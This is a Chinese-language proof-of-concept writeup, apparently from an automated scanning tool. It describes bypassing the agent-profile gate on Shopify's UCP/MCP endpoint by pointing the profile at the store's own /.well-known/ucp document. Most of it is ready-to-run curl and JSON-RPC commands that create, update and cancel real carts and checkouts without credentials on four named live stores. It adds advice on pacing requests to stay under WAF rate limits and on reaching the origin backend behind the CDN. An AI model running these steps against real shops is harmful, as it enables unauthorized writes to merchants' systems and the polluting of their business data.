# Shopify UCP/MCP 端点 /api/ucp/mcp：agent profile 门禁被店铺自身公开文档自绕 → 未认证调用写类工具 create_cart/create_checkout

- **code**: shopify-ucp-mcp-agent-profile-self-bypass-unauth-write
- **kind**: poc
- **category**: unauthorized
- **component**: Shopify UCP / MCP (Universal Commerce Protocol, JSON-RPC 2.0 端点 /api/ucp/mcp)
- **severity**: medium
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 四个独立 Shopify 店实测，均全程无 Cookie / 无 JWT。① goffsgames.co.uk（task#11）：profile=https://goffsgames.co.uk/.well-known/ucp → create_cart http=200 status:success id=gid://shopify/Cart/hWNJ1h...?key=...；create_checkout(qty2, buyer.email=pentest-probe@example.com) 200 status:success totals=7998 GBP + continue_url；update/cancel_cart 与 update/cancel_checkout 同 200 status:success；去 profile → 422 invalid_profile_url；get_order/complete_checkout → 403 {"code":-32000,"message":"AuthenticationRequired"}。② gamers-delight-online.myshopify.com（task#8，2026-11-11 14:32 UTC，原始响应 /opt/artex/data/tasks/8/i453/）：tools/list 200 回 14 工具；去 profile 的 search_catalog → 422 invalid_profile_url；带 profile 的 search_catalog → 200 status:success 回真实 gid://shopify/ProductVariant/46233783861529；create_cart(qty2) → 200 id=gid://shopify/Cart/hWNJ1iznQBNfehjeXUIpyq8u?key=...；create_checkout(qty1) → 200 id=gid://shopify/Checkout/hWNJ1j0Bso9hpG3CaHS6MQwa?key=...；update/cancel_cart 同 GID 均 200；get_order → 200 body code -32000；alg=none JWT 被拒。③ retro-refresh.com（task#9，原始响应 /opt/artex/data/tasks/9/i566/b0..b17.json）：GET/.well-known/ucp → 200（powered-by: Shopify，version 2026-08-25）；initialize 200；tools/list 200 回 14 工具；去 profile → 422 invalid_profile_url；profile 自绕后 search_catalog 200 回真实 variant 56946419499340；create_cart(qty1) 200 id=gid://shopify/Cart/hWNJ1kGQxP4nPS7wiip2RE7s?key=...，回显真实商品名 Apple iPod Video 5th Gen 与 price 34300；create_checkout(qty2) totals 68600=34300×2；update_cart(1→3)/cancel_cart 200；get_order/complete_checkout 403 code -32000；alg=none JWT 401 AuthenticationFailed；错 key→cart_not_found。④ www.retro32.com（task#12，finding#166，finding_checks.verdict=verified / status=confirmed；2026-11-11 20:55-21:03 UTC 本机 curl，原始响应 /opt/artex/data/tasks/12/i2862/）：GET https://www.retro32.com/.well-known/ucp → HTTP/2 200，content-type application/json，powered-by: Shopify，body {"ucp":{"version":"2026-08-25",...,"transport":"mcp","endpoint":"https://cns21d-0u.myshopify.com/api/ucp/mcp"}}；initialize 200 serverInfo=universal-commecommand execution validation-protocol；tools/list 200 14 工具；阴性对照（search_catalog 不带 profile）→ HTTP 422 {"code":-32001,"message":"UCP discovery failed","data":{"code":"invalid_profile_url","content":"Unable to fetch agent profile: Missing profile uri"}}；profile 自绕后 search_catalog 200 status:success 回 10 商品与真实 gid://shopify/ProductVariant/54482439831899（799 GBP）；create_cart qty1 → 200 status:success id=gid://shopify/Cart/hWNJ2MKGFvuqn134ukrq9MFs?key=f70ab79f... line_items (Nintendo 64 N64 Game Cartridge stand, qty1) subtotal/total 799；qty2 → 另一 GID gid://shopify/Cart/hWNJ2MMX47E6sJWWFqqcfT20?key=048947b1... totals 1598；update_cart 1→3 → 同 GID totals 2397；cancel_cart → 200 status:success，随后 get_cart 同 id → status:error messages[{code:cart_not_found}]；create_checkout qty1 → 200 status:success id=gid://shopify/Checkout/hWNJ2Lz2Z9fn8UU2snnNW1tY?key=8108... totals 2500，qty2 → gid://shopify/Checkout/hWNJ2M0f7SfWqAPg3uiHvwWO?key=3d92... totals 5000，update_checkout 1→3 → 7500；cancel_checkout → success 后 get_checkout → checkout_not_found；边界：get_order / complete_checkout 无 JWT → HTTP 403 {"code":-32000,"message":"AuthenticationRequired"}，alg=none JWT → HTTP 401 AuthenticationFailed "Invalid global access token."；别对象 GID+本把 key → status:error cart_not_found（key 绑定对象，非 IDOR）；直连 cns21d-0u.myshopify.com/api/ucp/mcp create_cart 同样 status:success totals 799。判定成立：零凭据下每次调用都在 Shopify 后端落成/变更真实对象（回显真实 GID+key，金额随 quantity 精确成倍），且去掉 profile 立即 422，证明是门禁自绕而非接口无门禁。
- **path**: pocs/shopify-ucp-mcp-agent-profile-self-bypass-unauth-write/poc.md
- **tags**: shopify,ucp,mcp,json-rpc,unauthorized,agent-profile,auth-bypass,create_cart,create_checkout,update_cart,cancel_cart,ecommerce
- **created_at**: 2026-11-11T14:29:48.251Z
- **engine**: www.retro32.com（后端 cns21d-0u.myshopify.com）; retro-refresh.com; goffsgames.co.uk; gamers-delight-online.myshopify.com（gamersdelight.co.uk）
- **found_by**: vuln-scan

## 描述

Shopify 托管店的 UCP（Universal Commerce Protocol）网关 /api/ucp/mcp 是一个 MCP JSON-RPC 2.0 端点，其「每次 tools/call 必须提供可达且合规的 agent profile」门禁形同虚设：把 arguments.meta.ucp-agent.profile 指向店铺自身的公开发现文档（https://<host>/.well-known/ucp，Shopify 自动提供，body 里还直接吐出 transport=mcp 与 endpoint={shop}.myshopify.com/api/ucp/mcp）即通过校验。于是任何匿名方可零凭据调用写类工具（create_cart / update_cart / cancel_cart / create_checkout / update_checkout / cancel_checkout），每次都在 Shopify 后端落成/变更真实 Cart/Checkout 对象并回显真实 gid://shopify/...?key=...（含真实商品名、价格，金额随 quantity 精确计算）。去掉 profile 立刻 422 invalid_profile_url，证明是门禁被自绕而非无门禁。影响限于未认证的资源创建与状态变更（可被刷废弃购物车/结账对象，污染商家报表/占用结账 ID），无跨对象读取（key 为对象绑定令牌，非 IDOR），get_order / complete_checkout 的 JWT 门禁未被绕过。已在 goffsgames.co.uk(task#11)、gamers-delight-online.myshopify.com(task#8)、retro-refresh.com(task#9)、www.retro32.com(task#12) 四个 Shopify 店实测成立，属 SaaS 级通性（4/4 命中，可直接作为 Shopify 店的通行检查项）。

## 用法

```
前置：目标为 Shopify 托管商店且开放 UCP/MCP 网关（探测：GET /.well-known/ucp 返回 200 JSON、响应头含 powered-by: Shopify 与 supported_versions）。无需任何 Cookie / JWT / 账号。WAF 按速率触发 → 单线程、请求间隔 ≥2.5s（约 30+ 发即 429，retry-after 可能数百秒）。

步骤 0 取「自绕凭据」（profile 值就是本 URL；顺带从 body 里拿真实后端端点）：
  curl -sk "https://TARGET/.well-known/ucp"        # 200 JSON 即存在
  # body 形如 {"ucp":{"version":"2026-08-25",...,"transport":"mcp","endpoint":"https://<shop>.myshopify.com/api/ucp/mcp"}}
  # 可直接用 endpoint 打后端；用 TARGET 域名打 /api/ucp/mcp 同效（反代到同一网关）

步骤 1 探活端点（initialize，无鉴权）：
  curl -sk -X POST "https://TARGET/api/ucp/mcp" -H 'Content-Type: application/json' -H 'Accept: application/json, text/event-stream' \
    -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"probe","version":"1"}}}'
  # 200 result.serverInfo.name = "universal-commecommand execution validation-protocol"（UCP server）→ 端点存活、无状态 MCP
  # 注意：协议版本回退不影响 tools/call

步骤 2 匿名枚举工具（tools/list 本身无鉴权）：
  curl -sk -X POST "https://TARGET/api/ucp/mcp" -H 'Content-Type: application/json' \
    -d '{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}'
  # 200，回 14 个工具：get_cart/create_cart/update_cart/cancel_cart/get_checkout/create_checkout/update_checkout/cancel_checkout/search_catalog/get_product/get_order/complete_checkout/ask_business/lookup_catalog

步骤 3 阴性对照（证明 profile 是门禁必需项，必做）：
  curl -sk -X POST "https://TARGET/api/ucp/mcp" -H 'Content-Type: application/json' \
    -d '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"search_catalog","arguments":{"catalog":{"query":"game"}}}}'
  # 期望 422 {"code":-32001,"data":{"code":"invalid_profile_url","content":"Unable to fetch agent profile: Missing profile uri"}} —— 确认门禁存在

步骤 4 用店铺自身 profile 绕门禁 + 未认证写 Cart（核心证据，先拿真实 variant id）：
  curl -sk -X POST "https://TARGET/api/ucp/mcp" -H 'Content-Type: application/json' -H 'Accept: application/json, text/event-stream' \
    -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"search_catalog","arguments":{"meta":{"ucp-agent":{"profile":"https://TARGET/.well-known/ucp"}},"catalog":{"query":"game"}}}}'
  # 200 status:success，回真实 gid://shopify/ProductVariant/<id> 与价格

  curl -sk -X POST "https://TARGET/api/ucp/mcp" -H 'Content-Type: application/json' \
    -d '{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"create_cart","arguments":{"meta":{"ucp-agent":{"profile":"https://TARGET/.well-known/ucp"}},"cart":{"line_items":[{"item":{"id":"gid://shopify/ProductVariant/<VARIANT_ID>"},"quantity":1}],"context":{"address_country":"GB"}}}}}'
  # 期望 200 status:success id=gid://shopify/Cart/<ID>?key=<KEY>，line_items 回真实商品名与单价，totals 与 quantity 成正比

步骤 5 未认证写 Checkout（可带 buyer.email，任意填入即可）：
  curl -sk -X POST "https://TARGET/api/ucp/mcp" -H 'Content-Type: application/json' \
    -d '{"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"create_checkout","arguments":{"meta":{"ucp-agent":{"profile":"https://TARGET/.well-known/ucp"}},"checkout":{"line_items":[{"item":{"id":"gid://shopify/ProductVariant/<VARIANT_ID>"},"quantity":1}],"buyer":{"email":"pentest-probe@example.com"}}}}}'
  # 期望 200 status:success id=gid://shopify/Checkout/<ID>?key=<KEY>，含真实商品名/价格/图片；quantity 2 时 totals 精确翻倍

同样可匿名成功的写工具：update_cart(带 id+meta) / cancel_cart(带 id+meta) / update_checkout / cancel_checkout，均 200 status:success，回显同一 GID。

判据（缺一不可）：① 全程无 Cookie/JWT；② 回 200 且 status:success 并回显真实 gid://shopify/{Cart,Checkout}/...?key=...（写确实落成）；③ 同一 variant 的 quantity 1→2→3，totals 精确成倍（如 799→1598→2397，2500→5000→7500），证明不是静态回显；④ 去掉 profile 立刻 422 invalid_profile_url（证明是 profile 绕过门禁而非根本没有门禁）；⑤ cancel 后 get 同 id → cart_not_found / checkout_not_found（状态变更真实落库）。

边界（务必记下，避免夸大）：get_order、complete_checkout 仍需 JWT —— 响应体 code=-32000 message=AuthenticationRequired；HTTP 状态码跨店不一致（goffsgames.co.uk / retro32.com 为 403，gamers-delight-online.myshopify.com 为 HTTP 200 + 同 body），判据看 body 的 code:-32000，不要只看 HTTP 状态码。带 alg=none 的 Authorization: Bearer JWT 亦被拒（retro32.com / retro-refresh.com 为 401 AuthenticationFailed "Invalid global access token"，有的店为 403）。用别对象的 Cart GID + 本把 key 组合 → 200 status:error cart_not_found（key 与对象绑定，非 IDOR，不能读他人对象）。影响面 = 未认证的资源创建/状态变更，不是数据泄露、不是账号接管。

失败常见原因：请求太快被 WAF 拦（429/403，retry-after 可能数百秒）→ 单线程 + ≥2.5s；缺少 .well-known/ucp 可达性（严格门禁店可能要求 profile 里带特定字段，但本模式四店均直接通过）；variant id 需先用 search_catalog/get_product 拿真实 gid://shopify/ProductVariant/...；请求头需同时带 Content-Type: application/json 与 Accept: application/json, text/event-stream；直接打后端 {shop}.myshopify.com 需 Host/TLS 对应正确。
```

## 正文

```
# Shopify UCP/MCP (/api/ucp/mcp) —— agent profile 门禁自绕，未认证写 Cart/Checkout

## 一句话
Shopify 托管店的 UCP/MCP JSON-RPC 网关，其 agent profile 门禁可用**店铺自身的公开文档** `https://<host>/.well-known/ucp` 绕过；任何匿名方可零凭据调用写类工具，在 Shopify 侧落成真实 Cart / Checkout 对象。属 SaaS 级通性（goffsgames.co.uk、gamers-delight-online.myshopify.com、retro-refresh.com、www.retro32.com 四店复现，4/4 命中）。

## 端点与协议
- 入口：`POST https://<host>/api/ucp/mcp`（也可直连 `https://<shop>.myshopify.com/api/ucp/mcp`，两者行为一致）
- 协议：JSON-RPC 2.0 over MCP（`initialize` / `tools/list` / `tools/call`）
- 必需请求头：`Content-Type: application/json`、`Accept: application/json, text/event-stream`
- 无状态：不需要 session / Cookie / JWT
- 工具清单（`tools/list`，共 14 个）：`search_catalog` `get_product` `get_cart` `create_cart` `update_cart` `cancel_cart` `get_checkout` `create_checkout` `update_checkout` `cancel_checkout` `get_order` `complete_checkout` `ask_business` `lookup_catalog`

## 门禁与绕过
- 门禁要求每次 `tools/call` 的 `arguments.meta.ucp-agent.profile` 提供一个**可达且合规的 agent profile**。
- 缺失/不可达 → `422 {"code":-32001,"data":{"code":"invalid_profile_url","content":"Unable to fetch agent profile: Missing profile uri"}}`
- 绕过：把 profile 指向店铺自己的 `https://<host>/.well-known/ucp`（该文档本就公开、由 Shopify 自动提供，body 内含 `transport:"mcp"` 与 `endpoint:"https://<shop>.myshopify.com/api/ucp/mcp"`，等于把后端地址也一并送出来）→ 校验通过。

## 复现链（无凭据）
```
# 0) 取“自绕凭据”
GET  https://<host>/.well-known/ucp                     -> 200 JSON (powered-by: Shopify)
     body: {"ucp":{"version":"2026-08-25","transport":"mcp","endpoint":"https://<shop>.myshopify.com/api/ucp/mcp",...}}

# 1) 探活
POST /api/ucp/mcp  {"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"probe","version":"1"}}}
     -> 200 result.serverInfo.name = "universal-commecommand execution validation-protocol"

# 2) 列工具（本身无鉴权）
POST /api/ucp/mcp  {"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}
     -> 200, 14 tools

# 3) 阴性对照：不带 profile
POST /api/ucp/mcp  {"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"search_catalog","arguments":{"catalog":{"query":"game"}}}}
     -> 422 invalid_profile_url  (证明门禁存在)

# 4) 阳线：profile 指向店铺自身文档，匿名读目录拿真实 variant
POST /api/ucp/mcp
{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"search_catalog",
 "arguments":{"meta":{"ucp-agent":{"profile":"https://<host>/.well-known/ucp"}},
 "catalog":{"query":"game"}}}}
     -> 200 status:success，回真实 gid://shopify/ProductVariant/<ID> 与价格

# 5) 匿名写 Cart
POST /api/ucp/mcp
{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"create_cart",
 "arguments":{"meta":{"ucp-agent":{"profile":"https://<host>/.well-known/ucp"}},
 "cart":{"line_items":[{"item":{"id":"gid://shopify/ProductVariant/<VARIANT_ID>"},"quantity":1}],
         "context":{"address_country":"GB"}}}}}
     -> 200 {"ucp":{"status":"success"},"id":"gid://shopify/Cart/<ID>?key=<KEY>"}

# 6) 匿名写 Checkout
POST /api/ucp/mcp
{"jsonrpc":"2.0","id":6,"method":"tools/call","params":{"name":"create_checkout",
 "arguments":{"meta":{"ucp-agent":{"profile":"https://<host>/.well-known/ucp"}},
 "checkout":{"line_items":[{"item":{"id":"gid://shopify/ProductVariant/<VARIANT_ID>"},"quantity":2}],
             "buyer":{"email":"pentest-probe@example.com"}}}}}
     -> 200 status:success id=gid://shopify/Checkout/<ID>?key=<KEY>，totals 随 quantity 精确翻倍

# 7) 状态变更
update_cart   (id + meta + cart.line_items)  -> 200 status:success，同 GID，totals 按新数量重算
cancel_cart   (id + meta)                    -> 200 status:success；随后 get_cart 同 id -> cart_not_found
update_checkout / cancel_checkout 同形。
```
同样可匿名成功的写工具：`update_cart` `cancel_cart` `update_checkout` `cancel_checkout`（均 200 status:success，回显同一 GID）。

## 边界（不要夸大）
- `get_order`、`complete_checkout` 仍需 JWT → body `{"code":-32000,"message":"AuthenticationRequired"}`。**不能读订单、不能匿名下单。**
  - 注意 HTTP 状态码跨店不一致：goffsgames.co.uk / www.retro32.com 侧为 403，gamers-delight-online.myshopify.com 侧为 HTTP 200 + 同 body。判据看 body 的 code:-32000。
- 带 `Authorization: Bearer <alg=none JWT>` 亦被拒（retro32.com / retro-refresh.com 侧 HTTP 401 + `AuthenticationFailed "Invalid global access token"`；有的店为 403）。
- key 与对象绑定：用 A 对象的 GID + B 对象的 key 组合 → `200 status:error code=cart_not_found`，非 IDOR。
- 影响面 = 未认证的资源创建 / 状态变更（可被滥用为 Abandoned-cart / Checkout 刷量，污染商家报表、占用结账对象），非数据泄露、非账号接管。

## 实战注意
- WAF 按速率触发：**单线程，请求间隔 ≥2.5s**；约 30+ 发命中 429（retry-after 可达数百秒）/403 退避。
- `VARIANT_ID` 需先用 `search_catalog` / `get_product` 拿真实 `gid://shopify/ProductVariant/<id>`。
- 判据必须是“回显真实 `gid://shopify/...` + status:success”，不要只看 HTTP 200；让 quantity 1→2→3 观察 totals 精确成倍，以佐证对象真实创建而非静态回显。
- `/.well-known/ucp` 的 body 里 `endpoint` 字段直接给出 `{shop}.myshopify.com/api/ucp/mcp`，可绕过 CDN 直打源站后端（retro32 实测直连后端 create_cart 同样 status:success、totals 799）。

## 多目标复现记录（同一 SaaS 缺陷）
| 目标 | 任务 | 时间 | 结果 |
|---|---|---|---|
| goffsgames.co.uk | task#11 | 2026-11-11 | create_cart/checkout 200 status:success；去 profile 422；get_order 403 |
| gamers-delight-online.myshopify.com（gamersdelight.co.uk） | task#8 | 2026-11-11 14:32 UTC | create_cart id=gid://shopify/Cart/hWNJ1iznQBNfehjeXUIpyq8u?key=...；create_checkout id=gid://shopify/Checkout/hWNJ1j0Bso9hpG3CaHS6MQwa?key=...；update/cancel_cart 200；get_order 200+body code -32000 |
| retro-refresh.com | task#9 | 2026-11-11 UTC | create_cart id=gid://shopify/Cart/hWNJ1kGQxP4nPS7wiip2RE7s?key=...（真实商品 Apple iPod Video 5th Gen，price 34300）；create_checkout qty2 totals=68600=34300×2；update_cart(1→3)/cancel_cart 200；get_order/complete_checkout 403；alg=none JWT 401；错 key→cart_not_found |
| www.retro32.com（后端 cns21d-0u.myshopify.com） | task#12（finding#166） | 2026-11-11 20:55-21:03 UTC | GET /.well-known/ucp 200（version 2026-08-25、transport mcp、endpoint 指向 cns21d-0u.myshopify.com/api/ucp/mcp）；去 profile 422 invalid_profile_url；create_cart qty1=799（gid://shopify/Cart/hWNJ2MKGFvuqn134ukrq9MFs?key=f70ab79f...）、qty2=1598（gid://shopify/Cart/hWNJ2MMX47E6sJWWFqqcfT20?key=048947b1...）；update_cart 1→3=2397 同 GID；cancel_cart 后 get_cart→cart_not_found；create_checkout qty1=2500、qty2=5000、update_checkout 1→3=7500（gid://shopify/Checkout/hWNJ2Lz2Z9fn8UU2snnNW1tY?key=8108... / hWNJ2M0f7SfWqAPg3uiHvwWO?key=3d92...）；cancel_checkout 后 get_checkout→checkout_not_found；get_order/complete_checkout 无 JWT→403 code -32000；alg=none JWT→401 AuthenticationFailed；别对象 GID+本把 key→cart_not_found；直连后端 create_cart 同样 status:success 799 |

原始响应落盘：goffsgames 见 tasks/11/i340、i390；gamersdelight 见 tasks/8/i453（r_ccart2.json / r_ccheck2.json / r_list.json / b1.json）；retro-refresh 见 tasks/9/i566/b0..b17.json；retro32 见 tasks/12/i2862（neg.resp / cart_ctx.resp / cart_ctx2.resp / ucart3.resp / cc_cart_ctx.resp / chk1.resp / chk2.resp / u_chk1.resp / c_chk2.resp / j_idor.resp / b_order.resp / b_complete.resp / f_direct.resp）。
```
